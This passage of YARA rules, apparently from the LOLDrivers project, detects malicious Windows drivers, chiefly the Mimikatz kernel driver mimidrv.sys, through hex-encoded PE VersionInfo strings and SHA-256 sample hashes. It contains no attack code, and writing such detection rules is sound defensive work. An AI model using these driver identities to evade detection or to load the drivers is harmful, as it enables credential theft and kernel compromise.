		hash = "d37996abc8efb29f1ccbb4335ce9ba9158bec86cc4775f0177112e87e4e3be5c"
		hash = "569fe70bedd0df8585689b0e88ad8bd0544fdf88b9dbfc2076f4bdbcf89c28aa"
		hash = "80e4c83cfa9d675a6746ab846fa5da76d79e87a9297e94e595a2d781e02673b3"
		hash = "1a5c08d40a5e73b9fe63ea5761eaec8f41d916ca3da2acbc4e6e799b06af5524"
		hash = "ee7b8eb150df2788bb9d5fe468327899d9f60d6731c379fd75143730a83b1c55"
		hash = "a1e6b431534258954db07039117b3159e889c6b9e757329bbd4126383c60c778"
		hash = "e99580e25f419b5ad90669e0c274cf63d30efa08065d064a863e655bdf77fb59"
		hash = "b0b80a11802b4a8ca69c818a03e76e7ef57c2e293de456439401e8e6073f8719"
		hash = "4c89c907b7525b39409af1ad11cc7d2400263601edafc41c935715ef5bd145de"
		hash = "083f821d90e607ed93221e71d4742673e74f573d0755a96ad17d1403f65a2254"
		hash = "e8ec06b1fa780f577ff0e8c713e0fd9688a48e0329c8188320f9eb62dfc0667f"
		hash = "ac5fb90e88d8870cd5569e661bea98cf6b001d83ab7c65a5196ea3743146939a"
		hash = "7b846b0a717665e4d9fb313f25d1f6a5b782e495387aea45cf87ad3c049ac0db"
		hash = "93aa3066ae831cdf81505e1bc5035227dc0e8f06ebbbb777832a17920c6a02fe"
		hash = "082a79311da64b6adc3655e79aa090a9262acaac3b917a363b9571f520a17f6a"
		hash = "bc49cb96f3136c3e552bf29f808883abb9e651040415484c1736261b52756908"
		hash = "95e5b5500e63c31c6561161a82f7f9373f99b5b1f54b018c4866df4f2a879167"
		hash = "d43520128871c83b904f3136542ea46644ac81a62d51ae9d3c3a3f32405aad96"
		hash = "94c71954ac0b1fd9fa2bd5c506a16302100ba75d9f84f39ee9b333546c714601"
		hash = "793b78e70b3ae3bb400c5a8bc4d2d89183f1d7fc70954aed43df7287248b6875"
		logic_hash = "9566444b1d3adb2a8a5f48b45bbbdb5c9be3ce399ec091e3ffd13780a90227f1"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000320030002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_DDF4
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "0b38be06-60df-5b49-a748-eb175e1db33f"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L123-L156"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "ddf427ce55b36db522f638ba38e34cd7b96a04cb3c47849b91e7554bfd09a69a"
		hash = "bcb774b6f6ff504d2db58096601bc5cb419c169bfbeaa3af852417e87d9b2aa0"
		hash = "af4f42197f5ce2d11993434725c81ecb6f54025110dedf56be8ffc0e775d9895"
		hash = "9dc7beb60a0a6e7238fc8589b6c2665331be1e807b4d2b3ddd1c258dbbd3e2f7"
		hash = "2da2b883e48e929f5365480d487590957d9e6582cc6da2c0b42699ba85e54fe2"
		hash = "29348ebe12d872c5f40e316a0043f7e5babe583374487345a79bad0ba93fbdfe"
		hash = "e4b2c0aa28aac5e197312a061b05363e2e0387338b28b23272b5b6659d29b1d8"
		hash = "897f2bbe81fc3b1ae488114b93f3eb0133a85678d061c7a6f718507971f33736"
		hash = "0f7bfa10075bf5c193345866333d415509433dbfe5a7d45664b88d72216ff7c3"
		hash = "469713c76c7a887826611b8c7180209a8bb6250f91d0f1eb84ac4d450ef15870"
		hash = "818787057fc60ac8b957aa37d750aa4bace8e6a07d3d28b070022ee6dcd603ab"
		hash = "4af8192870afe18c77381dfaf8478f8914fa32906812bb53073da284a49ae4c7"
		hash = "0740359baef32cbb0b14a9d1bd3499ea2e770ff9b1c85898cfac8fd9aca4fa39"
		hash = "62764ddc2dce74f2620cd2efd97a2950f50c8ac5a1f2c1af00dc5912d52f6920"
		hash = "3b2cd65a4fbdd784a6466e5196bc614c17d1dbaed3fd991d242e3be3e9249da6"
		logic_hash = "d20bfd9f05a7cdb031f3ada2801ee3b978a9d27407b4425c7aa7eb41b4549b18"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310036002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_0F58
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "0531a88d-cb21-5055-b365-a80b6e99a6e9"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L159-L191"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "0f58e09651d48d2b1bcec7b9f7bb85a2d1a7b65f7a51db281fe0c4f058a48597"
		hash = "087270d57f1626f29ba9c25750ca19838a869b73a1f71af50bdf37d6ff776212"
		hash = "0d676baac43d9e2d05b577d5e0c516fba250391ab0cb11232a4b17fd97a51e35"
		hash = "06ddf49ac8e06e6b83fccba1141c90ea01b65b7db592c54ffe8aa6d30a75c0b8"
		hash = "eab9b5b7e5fab1c2d7d44cd28f13ae8bb083d9362d2b930d43354a3dfd38e05a"
		hash = "627e13da6a45006fff4711b14754f9ccfac9a5854d275da798a22f3a68dd1eaa"
		hash = "b169a5f643524d59330fafe6e3e328e2179fc5116ee6fae5d39581467d53ac03"
		hash = "dfc80e0d468a2c115a902aa332a97e3d279b1fc3d32083e8cf9a4aadf3f54ad1"
		hash = "a74e8f94d2c140646a8bb12e3e322c49a97bd1b8a2e4327863d3623f43d65c66"
		hash = "94ba4bcbdb55d6faf9f33642d0072109510f5c57e8c963d1a3eb4f9111f30112"
		hash = "07759750fbb93c77b5c3957c642a9498fcff3946a5c69317db8d6be24098a4a0"
		hash = "4dc24fd07f8fb854e685bc540359c59f177de5b91231cc44d6231e33c9e932b1"
		hash = "baf7fbc4743a81eb5e4511023692b2dfdc32ba670ba3e4ed8c09db7a19bd82d3"
		hash = "bcca03ce1dd040e67eb71a7be0b75576316f0b6587b2058786fda8b6f0a5adfd"
		logic_hash = "ffa3eaf9032aa673119558217d212ff819ce91e99ab6c046f8801990d5826689"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310034002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_7662
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "2bb58484-03d2-5ccc-b165-cfe405f60f03"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L194-L235"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "7662187c236003308a7951c2f49c0768636c492f8935292d02f69e59b01d236d"
		hash = "a85d3fd59bb492a290552e5124bfe3f9e26a3086d69d42ccc44737b5a66673ec"
		hash = "60ee78a2b070c830fabb54c6bde0d095dff8fad7f72aa719758b3c41c72c2aa9"
		hash = "b2486f9359c94d7473ad8331b87a9c17ca9ba6e4109fd26ce92dff01969eaa09"
		hash = "d41e39215c2c1286e4cd3b1dc0948adefb161f22bc3a78756a027d41614ee4ff"
		hash = "008fa89822b7a1f91e5843169083202ea580f7b06eb6d5cae091ba844d035f25"
		hash = "8206ce9c42582ac980ff5d64f8e3e310bc2baa42d1a206dd831c6ab397fbd8fe"
		hash = "aafa642ca3d906138150059eeddb6f6b4fe9ad90c6174386cfe13a13e8be47d9"
		hash = "fefc070a5f6a9c0415e1c6f44512a33e8d163024174b30a61423d00d1e8f9bf2"
		hash = "6964a5d85639baee288555797992861232e75817f93028b50b8c6d34aa38b05b"
		hash = "443c0ba980d4db9213b654a45248fd855855c1cc81d18812cae9d16729ff9a85"
		hash = "e8743094f002239a8a9d6d7852c7852e0bb63cd411b007bd8c194bcba159ef15"
		hash = "ec96b15ce218f97ec1d8f07f13b052d274c4c8438f31daf246ccfaaee5e1bebd"
		hash = "beef40f1b4ce0ff2ee5c264955e6b2a0de6fe4089307510378adc83fad77228b"
		hash = "e858de280bd72d7538386a73e579580a6d5edba87b66b3671dc180229368be19"
		hash = "21617210249d2a35016e8ca6bd7a1edda25a12702a2294d56010ee8148637f5a"
		hash = "02ebf848fa618eba27065db366b15ee6629d98f551d20612ac38b9f655f37715"
		hash = "40556dd9b79b755cc0b48d3d024ceb15bd2c0e04960062ab2a85cd7d4d1b724a"
		hash = "8b30b2dc36d5e8f1ffc7281352923773fb821cdf66eb6516f82c697a524b599b"
		hash = "2ce4f8089b02017cbe86a5f25d6bc69dd8b6f5060c918a64a4123a5f3be1e878"
		hash = "d7aa8abdda8a68b8418e86bef50c19ef2f34bc66e7b139e43c2a99ab48c933be"
		hash = "82ac05fefaa8c7ee622d11d1a378f1d255b647ab2f3200fd323cc374818a83f2"
		hash = "c7cd14c71bcac5420872c3d825ff6d4be6a86f3d6a8a584f1a756541efff858e"
		logic_hash = "089f046e94a9cb4f576896e90375d6dbcaef61aa302af07f80230a74bc33ed18"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310037002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_14B8
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "a9965f8f-4969-52ae-953f-a06d8fabe951"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L238-L287"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "14b89298134696f2fd1b1df0961d36fa6354721ea92498a349dc421e79447925"
		hash = "36c65aeb255c06898ffe32e301030e0b74c8bca6fe7be593584b8fdaacd4e475"
		hash = "673bbc7fa4154f7d99af333014e888599c27ead02710f7bc7199184b30b38653"
		hash = "5295080de37d4838e15dec4e3682545033d479d3d9ac28d74747c086559fb968"
		hash = "8684aec77b4c3cafc1a6594de7e95695fa698625d4206a6c4b201875f76a5b38"
		hash = "69866557566c59772f203c11f5fba30271448e231b65806a66e48f41e3804d7f"
		hash = "a42f4ae69b8755a957256b57eb3d319678eab81705f0ffea0d649ace7321108f"
		hash = "62036cdf3663097534adf3252b921eed06b73c2562655eae36b126c7d3d83266"
		hash = "1ef7afea0cf2ef246ade6606ef8b7195de9cd7a3cd7570bff90ba1e2422276f6"
		hash = "b34e2d9f3d4ef59cf7af18e17133a6a06509373e69e33c8eecb2e30501d0d9e4"
		hash = "0aab2deae90717a8876d46d257401d265cf90a5db4c57706e4003c19eee33550"
		hash = "15cf366f7b3ee526db7ce2b5253ffebcbfaa4f33a82b459237c049f854a97c0c"
		hash = "c4c9c84b211899ceb0d18a839afa497537a7c7c01ab481965a09788a9e16590c"
		hash = "618b15970671700188f4102e5d0638184e2723e8f57f7e917fa49792daebdadb"
		hash = "4bca0a401b364a5cc1581a184116c5bafa224e13782df13272bc1b748173d1be"
		hash = "c7bccc6f38403def4690e00a0b31eda05973d82be8953a3379e331658c51b231"
		hash = "822982c568b6f44b610f8dc4ab5d94795c33ae08a6a608050941264975c1ecdb"
		hash = "b8c71e1844e987cd6f9c2baf28d9520d4ccdd8593ce7051bb1b3c9bf1d97076a"
		hash = "26bea3b3ab2001d91202f289b7e41499d810474607db7a0893ceab74f5532f47"
		hash = "c8ae217860f793fce3ad0239d7b357dba562824dd7177c9d723ca4d4a7f99a12"
		hash = "a78c9871da09fab21aec9b88a4e880f81ecb1ed0fa941f31cc2f041067e8e972"
		hash = "82b7fa34ad07dbf9afa63b2f6ed37973a1b4fe35dee90b3cf5c788c15c9f08f7"
		hash = "6d68d8a71a11458ddf0cbb73c0f145bee46ef29ce03ad7ece6bd6aa9d31db9b7"
		hash = "52f3905bbd97dcd2dbd22890e5e8413b9487088f1ee2fa828030a6a45b3975fd"
		hash = "64d4370843a07e25d4ceb68816015efcaeca9429bb5bb692a88e615b48c7da96"
		hash = "f3ec3f22639d45b3c865bb1ed7622db32e04e1dbc456298be02bf1f3875c3aac"
		hash = "51805bb537befaac8ce28f2221624cb4d9cefdc0260bc1afd5e0bc97bf1f9f93"
		hash = "c4fb31e3f24e40742a1b9855a2d67048fe64b26d8d2dbcec77d2d5deeded2bcc"
		hash = "d50cb5f4b28c6c26f17b9d44211e515c3c0cc2c0c4bf24cd8f9ed073238053ad"
		hash = "4999541c47abd4a7f2a002c180ae8d31c19804ce538b85870b8db53d3652862b"
		hash = "a32dc2218fb1f538fba33701dfd9ca34267fda3181e82eb58b971ae8b78f0852"
		logic_hash = "e4d4b0da09beff889931b8d90365c3a04ff4b5b410004fb820cb2551365cf63c"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310037002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_41AD
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "8a8887dd-0f3d-5ab4-a945-b47966789b99"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L290-L324"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "41ad660820c41fc8b1860b13dc1fea8bc8cb2faceb36ed3e29d40d28079d2b1f"
		hash = "a7a665a695ec3c0f862a0d762ad55aff6ce6014359647e7c7f7e3c4dc3be81b7"
		hash = "9a42fa1870472c38a56c0a70f62e57a3cdc0f5bc142f3a400d897b85d65800ac"
		hash = "f6157e033a12520c73dcedf8e49cd42d103e5874c34d6527bb9de25a5d26e5ad"
		hash = "31b66a57fae0cc28a6a236d72a35c8b6244f997e700f9464f9cbf800dbf8bee6"
		hash = "1d23ab46ad547e7eef409b40756aae9246fbdf545d13946f770643f19c715e80"
		hash = "704c6ffe786bc83a73fbdcd2edd50f47c3b5053da7da6aa4c10324d389a31db4"
		hash = "200f98655d1f46d2599c2c8605ebb7e335fee3883a32135ca1a81e09819bc64a"
		hash = "4bd4715d2a7af627da11513e32fab925c872babebdb7ff5675a75815fbf95021"
		hash = "9e56e96df36237e65b3d7dbc490afdc826215158f6278cd579c576c4b455b392"
		hash = "8b32fc8b15363915605c127ccbf5cbe71778f8dfbf821a25455496e969a01434"
		hash = "b0a27ac1a8173413de13860d2b2e34cb6bc4d1149f94b62d319042e11d8b004c"
		hash = "07beac65e28ee124f1da354293a3d6ad7250ed1ce29b8342acfd22252548a5af"
		hash = "c4f041de66ec8cc5ab4a03bbc46f99e073157a4e915a9ab4069162de834ffc5c"
		hash = "26ef7b27d1afb685e0c136205a92d29b1091e3dcf6b7b39a4ec03fbbdb57cb55"
		hash = "406b844f4b5c82caf26056c67f9815ad8ecf1e6e5b07d446b456e5ff4a1476f9"
		logic_hash = "a51e3e4c17122bf15b70b47693c3d24792cc7c7cbead1b26e501cb2907113968"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310039002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Sensecorp_42B2
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Sense5Ext.sys"
		author = "Florian Roth"
		id = "6b64ff77-866b-5d77-b2cf-5e507acc6cb9"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L327-L343"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "42b22faa489b5de936db33f12184f6233198bdf851a18264d31210207827ba25"
		logic_hash = "72e213913bf4317fa0751775e6a1a82ba2706e79c52fcd3e2c8ca69050e3a9d7"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006e0073006500350020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530065006e00730065003500200043004f00520050 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0035002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035002e0030002e0030 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Legalcorp_Pciexpressvideocapture_FD22
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PcieCubed.sys"
		author = "Florian Roth"
		id = "c9b28922-d4c7-5c09-9df8-b7b8d8ffc2e8"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L346-L364"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "fd223833abffa9cd6cc1848d77599673643585925a7ee51259d67c44d361cce8"
		logic_hash = "4c47a159595f420c520e6924238bd260f49ccf163208713c72c62638b13756d9"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005000430049006500200056006900640065006f00200043006100700074007500720065 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c006500670061006c00200043006f00720070002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e00310035 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e00310035 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]0050004300490020004500780070007200650073007300200056006900640065006f00200043006100700074007500720065 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005000630069006500430075006200650064002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00320030003100360020004c006500670061006c }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Windowsrwinddkprovider_Netfiltersys_Windowsrwinddkdriver_2060
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_206006a1.sys"
		author = "Florian Roth"
		id = "3b3135ae-8e40-5eca-a27e-91c62040b95d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L367-L386"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "206006a11f233b9ae876952308f6d60d7a75c80b4d530a3e6146a0b4d8cd3e4f"
		logic_hash = "e08a60ea78951ad56ce06ae3936ac5e1987d066224f79353e812a067265b5a28"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e0065007400460069006c007400650072002000530044004b00200057004600500020004400720069007600650072002000280057005000500029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0035002e0037 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0032002e0039003200300030002e00320030003500350037 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020004e0065007400460069006c00740065007200530044004b002e0063006f006d }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Pinchinstechnologycoltd_Rwtkrlsys_Ransomwareterminator_1A74
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_1a74c2bd.sys"
		author = "Florian Roth"
		id = "63f1a594-8549-5b93-97d7-883fdca263f1"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L389-L408"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "1a74c2bde0c9a76486657ccb9c79ea87c9891a32cdd4aa15c7542f7c9487a539"
		logic_hash = "b430f08ecf891aa9f6cfb3bc5278413045f6dddfe70f4ad51ab8ccc218a7a379"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200570054004b0072006c }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031003000300036 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006e0073006f006d0077006100720065005400650072006d0069006e00610074006f0072 }
